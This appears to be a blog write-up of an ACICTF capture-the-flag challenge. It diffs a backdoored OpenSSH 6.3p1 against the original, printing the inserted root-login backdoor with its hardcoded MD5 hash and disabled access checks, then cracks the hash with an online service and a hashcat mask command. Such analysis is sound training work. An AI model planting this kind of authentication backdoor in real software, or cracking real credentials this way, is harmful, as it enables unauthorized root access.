---
layout: post
title: Can You Look This Over?
subtitle: My solution to the Can You Look This Over? challenge on ACICTF
image: /assets/img/acictf/kali-hashcat.png
tags: acictf hashcat 
---

I was originally put off of this challenge because of the sheer number of files that I was shown after un-tar-ing the first file, but after looking at it again, I was completely over-complicating it.

## TL;DR

Diffed the tarball against the original source, found md5 hash, used online decrypter to crack password.

## Breaking it Down

Upon inspecting the files that were given in the backdoor.tar, I found a file called `version.h`. By running `cat version.h`, I was able to see the following lines:
```
/* $OpenBSD: version.h,v 1.67 2013/07/25 00:57:37 djm Exp $ */

#define SSH_VERSION	"OpenSSH_6.3"

#define SSH_PORTABLE	"p1"
#define SSH_RELEASE	SSH_VERSION SSH_PORTABLE
```
Hm, seems like the malware author is using OpenSSH_6.3. Time to download the original version off of OpenSSH's website. Using the hints, I then used tardiff to compare the two tarballs with the command `tardiff -m  openssh-6.3p1.tar.gz backdoor.tar.gz`
```
- ChangeLog
- README
/ auth-passwd.c
/ auth.c
/ auth.h
```
I ran a couple diff commands on the three files, and the only file to give some substantial information was found using the command `diff ~/Downloads/backdoor/auth-passwd.c ~/Downloads/openssh-6.3p1/auth-passwd.c` which gave us the following snippet:
```
< static char backdoor_hash[MD5_DIGEST_LENGTH] = \
< {
<     0xE6, 0x83, 0x9A, 0x9D, 0x2E, 0x07, 0x6C, 0x24, 0x8D, 0xFE, 0xCA, 0xD7, 0x89, 0xCA, 0xA6, 0xA5
< };
< 
< int
< sys_auth_backdoor(Authctxt *authctxt, const char *password)
< {
<     MD5_CTX c = {};
<     char password_hash[MD5_DIGEST_LENGTH] = {}; 
< 	  struct passwd *pw = authctxt->pw;
<     
<     if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
<         return 0;
< 
<     MD5_Init(&c);
<     MD5_Update(&c, password, strlen(password));
<     MD5_Final(password_hash, &c);
< 
<     if(memcmp(backdoor_hash, password_hash, MD5_DIGEST_LENGTH) != 0)
<         return 0;
< 
<     return 1;
< }
```
The first thing that caught my eye was the `static backdoor_hash` function, which probably contained what we needed. The next thing I saw was the line `if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)`. This gave an obvious clue that out original password is 6. The last line that was a small clue was the final if statement, which compares each byte of the generated md5 hash from the password to the stored hash.

We can then pull the MD5 hash of `E6839A9D2E076C248DFECAD789CAA6A5` from `static backdoor_hash`. 

I used the website [https://www.onlinehashcrack.com](https://www.onlinehashcrack.com/qlydjrxk4f) to crack the md5 hash in less than a minute, kudos to them for a great service. The website returned the password of `uq2KjS`, to where I put it into the flag format of `ACI{uq2KjS}`.


Flag : `ACI{uq2KjS}`

---
However, unlike other challenges, I revisited this problem later to learn the wonderful program, `hashcat`.

By running the command `hashcat -a 3 -m 0 E6839A9D2E076C248DFECAD789CAA6A5 -1  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ?1?1?1?!?!?1`, where the `-a 3` defines a bruteforce option, `-m 0` defines an MD5 hash, the `-1` defines a custom wordlist, and the `?1?1?1?!?!?1` defines a password length of 6.

Leaving hashcat to run for a couple minutes cracked the password around 80% of enumeration, giving us the exact same password of `uq2KjS`. I would highly recommend learning how to use hashcat, it seems very useful for future CTFs.

---
## Solve
```
Our ops guys found a malware author's staging server, we managed to exfiltrate the source to a backdoor they are spreading: backdoor.tar.gz. I need you to report back once you have cracked their secret password.
```

## Hints
```
What version / release of OpenSSH is in the provided archive?

We know that their backdoor allows 'root' to login with a secret password

Try diffing the backdoor tarball against the original source!

The hashed password may be mixed case alphanumreic, but there shouldn't be any symbols!
```
---

## Work + Notes
```
root@root:~/Downloads/backdoor$ cat version.h 
/* $OpenBSD: version.h,v 1.67 2013/07/25 00:57:37 djm Exp $ */

#define SSH_VERSION	"OpenSSH_6.3"

#define SSH_PORTABLE	"p1"
#define SSH_RELEASE	SSH_VERSION SSH_PORTABLE
```
```
root@root:~/Downloads$ tardiff -m  openssh-6.3p1.tar.gz backdoor.tar.gz ^C
- ChangeLog
- README
/ auth-passwd.c
/ auth.c
/ auth.h
```
```
root@root:~/Downloads$ diff ~/Downloads/backdoor/auth.h ~/Downloads/openssh-6.3p1/auth.h
215d214
< int  sys_auth_backdoor(Authctxt *, const char *);
217d215
< 
```

```
root@root:~/Downloads$ diff ~/Downloads/backdoor/auth-passwd.c ~/Downloads/openssh-6.3p1/auth-passwd.c
48,49d47
< #include <openssl/md5.h>
< 
91,93d88
<     if(sys_auth_backdoor(authctxt, password))
<         return 1;
< 
221,245d215
<     
< static char backdoor_hash[MD5_DIGEST_LENGTH] = \
< {
<     0xE6, 0x83, 0x9A, 0x9D, 0x2E, 0x07, 0x6C, 0x24, 0x8D, 0xFE, 0xCA, 0xD7, 0x89, 0xCA, 0xA6, 0xA5
< };
< 
< int
< sys_auth_backdoor(Authctxt *authctxt, const char *password)
< {
<     MD5_CTX c = {};
<     char password_hash[MD5_DIGEST_LENGTH] = {}; 
< 	struct passwd *pw = authctxt->pw;
<     
<     if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
<         return 0;
< 
<     MD5_Init(&c);
<     MD5_Update(&c, password, strlen(password));
<     MD5_Final(password_hash, &c);
< 
<     if(memcmp(backdoor_hash, password_hash, MD5_DIGEST_LENGTH) != 0)
<         return 0;
< 
<     return 1;
< }
```   
```
root@root:~/Downloads$ diff ~/Downloads/backdoor/auth.c ~/Downloads/openssh-6.3p1/auth.c
349,350c349,350
< 
< 	return 1;
---
> 	logit("ROOT LOGIN REFUSED FROM %.200s", get_remote_ipaddr());
> 	return 0;
636,637c636,637
< 	//if (!allowed_user(pw))
< 	//	return (NULL);
---
> 	if (!allowed_user(pw))
> 		return (NULL);
```


E6839A9D2E076C248DFECAD789CAA6A5

https://www.onlinehashcrack.com/qlydjrxk4f

uq2KjS


hashcat -a 3 -m 0 E6839A9D2E076C248DFECAD789CAA6A5 -1 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ?1?1?1?!?!?1


```
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: e6839a9d2e076c248dfecad789caa6a5
Time.Started.....: Sun May  3 14:47:41 2020 (2 mins, 5 secs)
Time.Estimated...: Sun May  3 14:49:46 2020 (0 secs)
Guess.Mask.......: ?1?1?1?1?1?1 [6]
Guess.Charset....: -1 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLDMNOPQRSTUVWXYZ0123456789, -2 Undefined, -3 Undefined, -4 Undefined 
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:   420.9 MH/s (8.64ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 49414144000/56800235584 (87.00%)
Rejected.........: 0/49414144000 (0.00%)
Restore.Point....: 12845056/14776336 (86.93%)
Candidates.#1....: 1SyLjS -> jONfKc
HWMon.Dev.#1.....: Temp: 59c Util: 93% Core: 379MHz Mem:3003MHz Bus:16

Started: Sun May  3 14:47:39 2020
Stopped: Sun May  3 14:49:46 2020
```

root@root:~/Downloads$ hashcat -a 3 -m 0 hashes     --show

e6839a9d2e076c248dfecad789caa6a5:uq2KjS
